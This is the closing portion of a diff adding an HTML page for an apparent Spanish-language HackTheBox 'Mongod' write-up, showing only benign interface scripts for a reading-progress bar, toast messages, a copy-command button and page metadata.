+    const winScroll = document.documentElement.scrollTop;
+    const height = document.documentElement.scrollHeight - window.innerHeight;
+    const scrolled = height > 0 ? (winScroll / height) * 100 : 0;
+    const bar = document.getElementById('readingProgress');
+    if (bar) bar.style.width = scrolled + '%';
+  });
+
+  // TOAST
+  function showToast(msg) {
+    let toast = document.querySelector('.toast');
+    if (!toast) {
+      toast = document.createElement('div');
+      toast.className = 'toast';
+      document.body.appendChild(toast);
+    }
+    toast.textContent = '📋 ' + msg;
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 2000);
+  }
+
+  // COPY COMMAND
+  function copyCmd(btn) {
+    const block = btn.closest('.cmd-block');
+    const cmd = block.dataset.cmd || '';
+    navigator.clipboard.writeText(cmd).then(() => {
+      btn.textContent = '✓ OK';
+      btn.classList.add('copied');
+      showToast('Comando copiado ✓');
+      setTimeout(() => {
+        btn.textContent = 'COPY';
+        btn.classList.remove('copied');
+      }, 1800);
+    }).catch(() => {
+      showToast('Error al copiar');
+    });
+  }
+</script>
+<script id="datos-writeup" type="application/json">{"nombre": "MONGOD", "plataforma": "hackthebox", "dificultad": "muy-facil", "url": "https://brandeiks.github.io/writeups/hackthebox/muy-facil/mongod.html"}</script>
+<script src="../../../assets/cursor.js" defer></script>
+<script src="../../../assets/writeup.js" defer></script>
+</body>
+</html>
